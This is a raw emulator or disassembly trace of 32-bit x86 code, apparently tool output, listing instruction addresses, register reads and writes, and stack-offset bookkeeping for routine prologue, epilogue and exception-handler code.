[30], regs_write: [30] 0x41b333: mov esi, eax, regs_read: [19], regs_write: [29] 0x41b339: push 0x4c8a50, regs_read: [30], regs_write: [30] 0x41b344: mov esi, eax, regs_read: [19], regs_write: [29] 0x41b34a: push 0x4c9adc, regs_read: [30], regs_write: [30] 0x41b34f: push esi, regs_read: [30, 29], regs_write: [30] 0x41b356: push 0x4c9af8, regs_read: [30], regs_write: [30] 0x41b35b: push esi, regs_read: [30, 29], regs_write: [30] 0x41b35c: mov edi, eax, regs_read: [19], regs_write: [23] 0x41b36c: mov dword ptr [0x4ef978], edi, regs_read: [23], regs_write: () 0x41b372: mov dword ptr [0x4ef97c], eax, regs_read: [19], regs_write: () 0x41b377: pop edi, regs_read: [30], regs_write: [30, 23] 0x41b378: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b37c: push eax, regs_read: [30, 19], regs_write: [30] 0x41b37d: push eax, regs_read: [30, 19], regs_write: [30] 0x41b37e: push 1, regs_read: [30], regs_write: [30] 0x41b380: push eax, regs_read: [30, 19], regs_write: [30] 0x41b387: mov dword ptr [0x4ef95c], eax, regs_read: [19], regs_write: () 0x41b390: push 7, regs_read: [30], regs_write: [30] 0x41b398: push 0x4ef960, regs_read: [30], regs_write: [30] 0x41b3a3: mov eax, dword ptr [0x4ef95c], regs_read: (), regs_write: [19] 0x41b3ac: push eax, regs_read: [30, 19], regs_write: [30] 0x41b3b4: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b3b5: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x34 and offset 0x8000 for stack size 0x10000 0x41b3b7: push esi, regs_read: [30, 29], regs_write: [30] 0x41b3b8: mov esi, 0x4ef960, regs_read: (), regs_write: [29] 0x41b3bd: push esi, regs_read: [30, 29], regs_write: [30] 0x41b3c4: mov ecx, dword ptr [0x4eb048], regs_read: (), regs_write: [22] 0x41b3ca: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x3c and offset 0x8008 for stack size 0x10000 0x41b3ce: mov dword ptr [0x4eb048], ecx, regs_read: [22], regs_write: () 0x41b3d4: push esi, regs_read: [30, 29], regs_write: [30] 0x41b3d5: mov dword ptr [eax], ecx, regs_read: [19, 22], regs_write: () 0x41b3d7: mov eax, dword ptr fs:[0x2c], regs_read: [32], regs_write: [19] 0x41b3dd: mov ecx, dword ptr [0x4ef98c], regs_read: (), regs_write: [22] 0x41b3e3: mov ecx, dword ptr [eax + ecx*4], regs_read: [19, 22], regs_write: [22] 0x41b3e6: mov eax, dword ptr [0x4eb048], regs_read: (), regs_write: [19] 0x41b3eb: mov dword ptr [ecx + 4], eax, regs_read: [22, 19], regs_write: () 0x41b3f7: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b3f8: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b3fe: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b3ff: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x3c and offset 0x8000 for stack size 0x10000 0x41b401: push esi, regs_read: [30, 29], regs_write: [30] 0x41b402: push edi, regs_read: [30, 23], regs_write: [30] 0x41b403: mov edi, 0x4ef960, regs_read: (), regs_write: [23] 0x41b408: push edi, regs_read: [30, 23], regs_write: [30] 0x41b40f: mov esi, dword ptr [ebp + 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x48 and offset 0x8008 for stack size 0x10000 0x41b41c: push 0x64, regs_read: [30], regs_write: [30] 0x41b423: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b42b: mov eax, dword ptr fs:[0x2c], regs_read: [32], regs_write: [19] 0x41b431: mov ecx, dword ptr [0x4ef98c], regs_read: (), regs_write: [22] 0x41b437: mov ecx, dword ptr [eax + ecx*4], regs_read: [19, 22], regs_write: [22] 0x41b43a: mov eax, dword ptr [0x4eb048], regs_read: (), regs_write: [19] 0x41b43f: mov dword ptr [ecx + 4], eax, regs_read: [22, 19], regs_write: () 0x41b445: push edi, regs_read: [30, 23], regs_write: [30] 0x41b44c: pop edi, regs_read: [30], regs_write: [30, 23] 0x41b44d: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b44e: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b450: push esi, regs_read: [30, 29], regs_write: [30] 0x41b451: mov esi, dword ptr [0x4ef97c], regs_read: (), regs_write: [29] 0x41b45b: push 0x4ef958, regs_read: [30], regs_write: [30] 0x41b460: mov ecx, esi, regs_read: [29], regs_write: [22] 0x41b46a: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b46c: push dword ptr [0x4ef95c], regs_read: [30], regs_write: [30] 0x41b478: push dword ptr [0x4ef95c], regs_read: [30], regs_write: [30] 0x41b484: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b486: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b487: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x4c and offset 0x8000 for stack size 0x10000 0x41b489: push esi, regs_read: [30, 29], regs_write: [30] 0x41b48a: mov esi, dword ptr [0x4ef978], regs_read: (), regs_write: [29] 0x41b494: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b497: mov ecx, esi, regs_read: [29], regs_write: [22] 0x41b499: push 0x4ef960, regs_read: [30], regs_write: [30] 0x41b49e: push 0x4ef958, regs_read: [30], regs_write: [30] 0x41b4ad: mov esi, 0x4ef960, regs_read: (), regs_write: [29] 0x41b4b2: push esi, regs_read: [30, 29], regs_write: [30] 0x41b4b9: push 0, regs_read: [30], regs_write: [30] 0x41b4bb: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b4be: push dword ptr [0x4ef95c], regs_read: [30], regs_write: [30] 0x41b4ca: push esi, regs_read: [30, 29], regs_write: [30] 0x41b4d1: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b4d2: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b4d4: push esi, regs_read: [30, 29], regs_write: [30] 0x41b4d5: push 2, regs_read: [30], regs_write: [30] 0x41b4e1: push eax, regs_read: [30, 19], regs_write: [30] 0x41b4ec: mov esi, eax, regs_read: [19], regs_write: [29] 0x41b4f3: push 1, regs_read: [30], regs_write: [30] 0x41b4f5: mov dword ptr [eax], esi, regs_read: [19, 29], regs_write: () 0x41b4ff: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b50b: push 0x41bea6, regs_read: [30], regs_write: [30] 0x41b51a: push eax, regs_read: [30, 19], regs_write: [30] 0x41b520: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b521: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b534: push 0x40af61, regs_read: [30], regs_write: [30] 0x41b53e: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b553: push eax, regs_read: [30, 19], regs_write: [30] 0x41b559: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b577: push 7, regs_read: [30], regs_write: [30] 0x41b591: push eax, regs_read: [30, 19], regs_write: [30] 0x41b597: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b599: push 0x14, regs_read: [30], regs_write: [30] 0x41b59b: push 0x4e8628, regs_read: [30], regs_write: [30] 0x41b5a5: push 1, regs_read: [30], regs_write: [30] 0x41b5ac: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b5b7: mov byte ptr [ebp - 0x19], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x80 and offset 0x7fe7 for stack size 0x10000 saving data to stack: 0 1 0x41b5c3: mov byte ptr [ebp - 0x24], al, regs_read: [20, 2], regs_write: () adjusting stack for ESP -0x80 and offset 0x7fdc for stack size 0x10000 saving data to stack: 1 1 0x41b5c6: mov eax, dword ptr [0x4ef934], regs_read: (), regs_write: [19] 0x41b5da: mov dword ptr [0x4ef934], ecx, regs_read: [22], regs_write: () 0x41b5e0: push 0x4c844c, regs_read: [30], regs_write: [30] 0x41b5e5: push 0x4c8424, regs_read: [30], regs_write: [30] 0x41b5ef: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b5f0: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b5f5: mov dword ptr [ebp - 4], 0xfffffffe, regs_read: [20], regs_write: () adjusting stack for ESP -0x80 and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967294 4 0x41b5fc: mov eax, 0xff, regs_read: (), regs_write: [19] 0x41b606: push 0x4c8420, regs_read: [30], regs_write: [30] 0x41b60b: push 0x4c8360, regs_read: [30], regs_write: [30] 0x41b615: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b616: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b617: mov dword ptr [0x4ef934], 2, regs_read: (), regs_write: () 0x41b623: mov bl, cl, regs_read: [10], regs_write: [5] 0x41b625: mov byte ptr [ebp - 0x19], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x80 and offset 0x7fe7 for stack size 0x10000 saving data to stack: 0 1 0x41b628: push dword ptr [ebp - 0x24], regs_read: [30, 20], regs_write: [30] 0x41b630: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b636: mov esi, eax, regs_read: [19], regs_write: [29] 0x41b63e: push esi, regs_read: [30, 29], regs_write: [30] 0x41b644: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b649: mov esi, dword ptr [esi], regs_read: [29], regs_write: [29] 0x41b64b: push edi, regs_read: [30, 23], regs_write: [30] 0x41b64c: push 2, regs_read: [30], regs_write: [30] 0x41b64e: push edi, regs_read: [30, 23], regs_write: [30] 0x41b64f: mov ecx, esi, regs_read: [29], regs_write: [22] 0x41b65e: mov esi, eax, regs_read: [19], regs_write: [29] 0x41b664: push esi, regs_read: [30, 29], regs_write: [30] 0x41b66a: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b66f: push dword ptr [esi], regs_read: [30, 29], regs_write: [30] 0x41b676: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b684: push esi, regs_read: [30, 29], regs_write: [30] 0x41b685: push eax, regs_read: [30, 19], regs_write: [30] 0x41b686: push edi, regs_read: [30, 23], regs_write: [30] 0x41b687: push 0x400000, regs_read: [30], regs_write: [30] 0x41b691: mov esi, eax, regs_read: [19], regs_write: [29] 0x41b6a5: push edi, regs_read: [30, 23], regs_write: [30] 0x41b6a6: push 1, regs_read: [30], regs_write: [30] 0x41b6ad: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b6ae: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b6af: mov dword ptr [ebp - 4], 0xfffffffe, regs_read: [20], regs_write: () adjusting stack for ESP -0x9c and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967294 4 0x41b6b6: mov eax, esi, regs_read: [29], regs_write: [19] 0x41b6ba: mov ecx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x9c and offset 0x7fec for stack size 0x10000 0x41b6bd: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x41b6bf: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x41b6c1: mov dword ptr [ebp - 0x20], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x9c and offset 0x7fe0 for stack size 0x10000 saving data to stack: 255 4 0x41b6c4: push ecx, regs_read: [30, 22], regs_write: [30] 0x41b6c5: push eax, regs_read: [30, 19], regs_write: [30] 0x41b6cb: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b6cc: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b6ce: mov esp, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [30] adjusting stack for ESP -0x9c and offset 0x7fe8 for stack size 0x10000 0x41b6e5: mov dword ptr [ebp - 4], 0xfffffffe, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967294 4 0x41b6ec: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x41b6ef: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x41b6f2: mov dword ptr fs:[0], ecx, regs_read: [32, 22], regs_write: () 0x41b6f9: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b6fa: pop edi, regs_read: [30], regs_write: [30, 23] 0x41b6fb: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b6fc: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41b6ff: push 7, regs_read: [30], regs_write: [30] 0x41b706: push esi, regs_read: [30, 29], regs_write: [30] 0x41b70c: push dword ptr [ebp - 0x20], regs_read: [30, 20], regs_write: [30] 0x41b72d: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b72e: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x41b741: push 0xa, regs_read: [30], regs_write: [30] 0x41b757: push ebx, regs_read: [30, 21], regs_write: [30] 0x41b758: push esi, regs_read: [30, 29], regs_write: [30] 0x41b759: push edi, regs_read: [30, 23], regs_write: [30] 0x41b75f: push ebx, regs_read: [30, 21], regs_write: [30] 0x41b762: mov esi, ebx, regs_read: [21], regs_write: [29] 0x41b764: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41b766: mov dword ptr [edi], eax, regs_read: [23, 19], regs_write: () 0x41b768: mov dword ptr [edi + 4], esi, regs_read: [23, 29], regs_write: () 0x41b76b: mov dword ptr [edi + 8], ecx, regs_read: [23, 22], regs_write: () 0x41b770: mov dword ptr [edi + 0xc], edx, regs_read: [23, 24], regs_write: () 0x41b773: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x7fdc for stack size 0x10000 0x41b776: mov edi, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x10 and offset 0x7fe0 for stack size 0x10000 0x41b779: mov dword ptr [ebp - 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x10 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x41b782: mov eax, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x7fe8 for stack size 0x10000 0x41b78a: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x10 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41b78d: mov eax, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x7fe4 for stack size 0x10000 0x41b795: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x10 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x41b79b: push ebx, regs_read: [30, 21], regs_write: [30] 0x41b79e: mov esi, ebx, regs_read: [21], regs_write: [29] 0x41b7a0: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41b7a5: mov dword ptr [ebx], eax, regs_read: [21, 19], regs_write: () 0x41b7a7: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x7ffc for stack size 0x10000 0x41b7af: mov dword ptr [ebx + 4], esi, regs_read: [21, 29], regs_write: () 0x41b7b2: mov dword ptr [ebx + 8], ecx, regs_read: [21, 22], regs_write: () 0x41b7b5: mov dword ptr [ebx + 0xc], edx, regs_read: [21, 24], regs_write: () 0x41b7ba: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x7fdc for stack size 0x10000 0x41b7ec: mov edi, dword ptr [0x4ef984], regs_read: (), regs_write: [23] 0x41b7f5: mov dword ptr [0x4ef984], edi, regs_read: [23], regs_write: () 0x41b7fd: mov edi, dword ptr [0x4ef984], regs_read: (), regs_write: [23] 0x41b803: mov ecx, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x10 and offset 0x7fe4 for stack size 0x10000 0x41b806: push 7, regs_read: [30], regs_write: [30] 0x41b808: pop eax, regs_read: [30], regs_write: [30, 19] 0x41b809: mov dword ptr [ebp - 4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x10 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41b813: push ebx, regs_read: [30, 21], regs_write: [30] 0x41b816: mov esi, ebx, regs_read: [21], regs_write: [29] 0x41b818: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41b81d: mov dword ptr [ebx], eax, regs_read: [21, 19], regs_write: () 0x41b81f: mov dword ptr [ebx + 4], esi, regs_read: [21, 29], regs_write: () 0x41b822: mov dword ptr [ebx + 8], ecx, regs_read: [21, 22], regs_write: () 0x41b825: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x10 and offset 0x7ffc for stack size 0x10000 0x41b828: mov dword ptr [ebx + 0xc], edx, regs_read: [21, 24], regs_write: () 0x41b82b: mov ebx, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x10 and offset 0x7fe0 for stack size 0x10000 0x41b839: mov dword ptr [0x4ef984], edi, regs_read: [23], regs_write: () 0x41b841: mov ebx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x10 and offset 0x7ff0 for stack size 0x10000 0x41b844: mov eax, dword ptr [0x4eb054], regs_read: (), regs_write: [19] 0x41b84c: mov dword ptr [0x4ef980], 1, regs_read: (), regs_write: () 0x41b856: mov dword ptr [0x4eb054], eax, regs_read: [19], regs_write: () 0x41b86a: mov dword ptr [0x4ef980], 2, regs_read: (), regs_write: () 0x41b874: mov dword ptr [0x4eb054], eax, regs_read: [19], regs_write: () 0x41b88e: mov dword ptr [ebp - 0x14], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x10 and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x41b891: mov dword ptr [ebp - 0x10], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x10 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 1024 4 0x41b894: mov eax, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x7fec for stack size 0x10000 0x41b897: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x10 and offset 0x7ff0 for stack size 0x10000 0x41b89a: push 6, regs_read: [30], regs_write: [30] 0x41b89c: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b8a3: mov eax, dword ptr [0x4eb054], regs_read: (), regs_write: [19] 0x41b8ab: mov dword ptr [0x4ef980], 3, regs_read: (), regs_write: () 0x41b8b5: mov dword ptr [0x4eb054], eax, regs_read: [19], regs_write: () 0x41b8c2: mov dword ptr [0x4ef980], 5, regs_read: (), regs_write: () 0x41b8cc: mov dword ptr [0x4eb054], eax, regs_read: [19], regs_write: () 0x41b8d1: mov eax, 0xd0030000, regs_read: (), regs_write: [19] 0x41b8dc: mov eax, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x7fec for stack size 0x10000 0x41b8df: mov edx, 0xe0, regs_read: (), regs_write: [24] 0x41b8e4: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x10 and offset 0x7ff0 for stack size 0x10000 0x41b8f4: mov dword ptr [0x4ef980], esi, regs_read: [29], regs_write: () 0x41b8fa: pop edi, regs_read: [30], regs_write: [30, 23] 0x41b8fb: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b8fc: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41b901: mov ecx, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x4 and offset 0x7ff4 for stack size 0x10000 0x41b904: mov dword ptr fs:[0], ecx, regs_read: [32, 22], regs_write: () 0x41b90b: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b90c: pop edi, regs_read: [30], regs_write: [30, 23] 0x41b90d: pop edi, regs_read: [30], regs_write: [30, 23] 0x41b90e: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b90f: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41b910: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x10 and offset 0x8000 for stack size 0x10000 0x41b912: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b913: push ecx, regs_read: [30, 22], regs_write: [30] 0x41b915: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x41b924: push eax, regs_read: [30, 19], regs_write: [30] 0x41b925: push dword ptr fs:[0], regs_read: [30, 32], regs_write: [30] 0x41b934: push ebx, regs_read: [30, 21], regs_write: [30] 0x41b935: push esi, regs_read: [30, 29], regs_write: [30] 0x41b936: push edi, regs_read: [30, 23], regs_write: [30] 0x41b937: mov dword ptr [eax], ebp, regs_read: [19, 20], regs_write: () 0x41b939: mov ebp, eax, regs_read: [19], regs_write: [20] 0x41b93b: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41b942: push eax, regs_read: [30, 19], regs_write: [30] 0x41b943: push dword ptr [ebp - 4], regs_read: [30, 20], regs_write: [30] 0x41b946: mov dword ptr [ebp - 4], 0xffffffff, regs_read: [20], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967295 4 0x41b950: mov dword ptr fs:[0], eax, regs_read: [32, 19], regs_write: () 0x41b957: push eax, regs_read: [30, 19], regs_write: [30] 0x41b958: push dword ptr fs:[0], regs_read: [30, 32], regs_write: [30] 0x41b967: push ebx, regs_read: [30, 21], regs_write: [30] 0x41b968: push esi, regs_read: [30, 29], regs_write: [30] 0x41b969: push edi, regs_read: [30, 23], regs_write: [30] 0x41b96a: mov dword ptr [eax], ebp, regs_read: [19, 20], regs_write: () 0x41b96c: mov ebp, eax, regs_read: [19], regs_write: [20] 0x41b96e: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41b975: push eax, regs_read: [30, 19], regs_write: [30] 0x41b976: mov dword ptr [ebp - 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x34 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x41b979: push dword ptr [ebp - 4], regs_read: [30, 20], regs_write: [30] 0x41b97c: mov dword ptr [ebp - 4], 0xffffffff, regs_read: [20], regs_write: () adjusting stack for ESP -0x38 and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967295 4 0x41b986: mov dword ptr fs:[0], eax, regs_read: [32, 19], regs_write: () 0x41b98d: push eax, regs_read: [30, 19], regs_write: [30] 0x41b98e: push dword ptr fs:[0], regs_read: [30, 32], regs_write: [30] 0x41b99d: push ebx, regs_read: [30, 21], regs_write: [30] 0x41b99e: push esi, regs_read: [30, 29], regs_write: [30] 0x41b99f: push edi, regs_read: [30, 23], regs_write: [30] 0x41b9a0: mov dword ptr [eax], ebp, regs_read: [19, 20], regs_write: () 0x41b9a2: mov ebp, eax, regs_read: [19], regs_write: [20] 0x41b9a4: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41b9ab: push eax, regs_read: [30, 19], regs_write: [30] 0x41b9ac: mov dword ptr [ebp - 0x10], esp, regs_read: [20, 30], regs_write: () adjusting stack for ESP -0x50 and offset 0x7ff0 for stack size 0x10000 saving data to stack: -80 4 0x41b9af: push dword ptr [ebp - 4], regs_read: [30, 20], regs_write: [30] 0x41b9b2: mov dword ptr [ebp - 4], 0xffffffff, regs_read: [20], regs_write: () adjusting stack for ESP -0x54 and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967295 4 0x41b9bc: mov dword ptr fs:[0], eax, regs_read: [32, 19], regs_write: () 0x41b9d0: push ebx, regs_read: [30, 21], regs_write: [30] 0x41b9d1: push esi, regs_read: [30, 29], regs_write: [30] 0x41b9d2: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x5c and offset 0x8018 for stack size 0x10000 0x41b9da: mov ecx, dword ptr [esp + 0x14], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x5c and offset 0x8014 for stack size 0x10000 0x41b9de: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x5c and offset 0x8010 for stack size 0x10000 0x41b9e6: mov ebx, eax, regs_read: [19], regs_write: [21] 0x41b9e8: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x5c and offset 0x800c for stack size 0x10000 0x41b9ee: mov edx, ebx, regs_read: [21], regs_write: [24] 0x41b9f2: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41b9f4: mov ebx, dword ptr [esp + 0x14], regs_read: [30], regs_write: [21] adjusting stack for ESP -0x5c and offset 0x8014 for stack size 0x10000 0x41b9f8: mov edx, dword ptr [esp + 0x10], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x5c and offset 0x8010 for stack size 0x10000 0x41b9fc: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x5c and offset 0x800c for stack size 0x10000 0x41ba0e: mov esi, eax, regs_read: [19], regs_write: [29] 0x41ba14: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41ba16: mov eax, dword ptr [esp + 0x14], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x5c and offset 0x8014 for stack size 0x10000 0x41ba31: mov eax, esi, regs_read: [29], regs_write: [19] 0x41ba33: pop esi, regs_read: [30], regs_write: [30, 29] 0x41ba34: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41ba40: push ebx, regs_read: [30, 21], regs_write: [30] 0x41ba41: mov eax, dword ptr [esp + 0x14], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x58 and offset 0x8014 for stack size 0x10000 0x41ba49: mov ecx, dword ptr [esp + 0x10], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x58 and offset 0x8010 for stack size 0x10000 0x41ba4d: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x58 and offset 0x800c for stack size 0x10000 0x41ba55: mov eax, dword ptr [esp + 8], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x58 and offset 0x8008 for stack size 0x10000 0x41ba5b: mov eax, edx, regs_read: [24], regs_write: [19] 0x41ba61: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41ba63: mov ebx, dword ptr [esp + 0x10], regs_read: [30], regs_write: [21] adjusting stack for ESP -0x58 and offset 0x8010 for stack size 0x10000 0x41ba67: mov edx, dword ptr [esp + 0xc], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x58 and offset 0x800c for stack size 0x10000 0x41ba6b: mov eax, dword ptr [esp + 8], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x58 and offset 0x8008 for stack size 0x10000 0x41ba7d: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41bab1: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41bac0: push ecx, regs_read: [30, 22], regs_write: [30] 0x41bad0: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41bad6: push ecx, regs_read: [30, 22], regs_write: [30] 0x41bae6: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41baf0: mov eax, dword ptr [esp + 8], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x54 and offset 0x8008 for stack size 0x10000 0x41baf4: mov ecx, dword ptr [esp + 0x10], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x54 and offset 0x8010 for stack size 0x10000 0x41bafa: mov ecx, dword ptr [esp + 0xc], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x54 and offset 0x800c for stack size 0x10000 0x41bb00: mov eax, dword ptr [esp + 4], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x54 and offset 0x8004 for stack size 0x10000 0x41bb09: push ebx, regs_read: [30, 21], regs_write: [30] 0x41bb0c: mov ebx, eax, regs_read: [19], regs_write: [21] 0x41bb0e: mov eax, dword ptr [esp + 8], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x58 and offset 0x8008 for stack size 0x10000 0x41bb18: mov eax, dword ptr [esp + 8], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x58 and offset 0x8008 for stack size 0x10000 0x41bb20: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41bb30: push ebp, regs_read: [30, 20], regs_write: [30] 0x41bb31: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x58 and offset 0x8000 for stack size 0x10000 0x41bb39: push ebx, regs_read: [30, 21], regs_write: [30] 0x41bb3a: push 0x17, regs_read: [30], regs_write: [30] 0x41bb46: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x60 and offset 0x8008 for stack size 0x10000 0x41bb4b: push 3, regs_read: [30], regs_write: [30] 0x41bb52: mov dword ptr [esp], 0x2cc, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8000 for stack size 0x10000 saving data to stack: 716 4 0x41bb5f: push 0, regs_read: [30], regs_write: [30] 0x41bb61: push eax, regs_read: [30, 19], regs_write: [30] 0x41bb6a: mov dword ptr [ebp - 0x274], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d8c for stack size 0x10000 saving data to stack: 0 4 0x41bb70: mov dword ptr [ebp - 0x278], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d88 for stack size 0x10000 saving data to stack: 4294967295 4 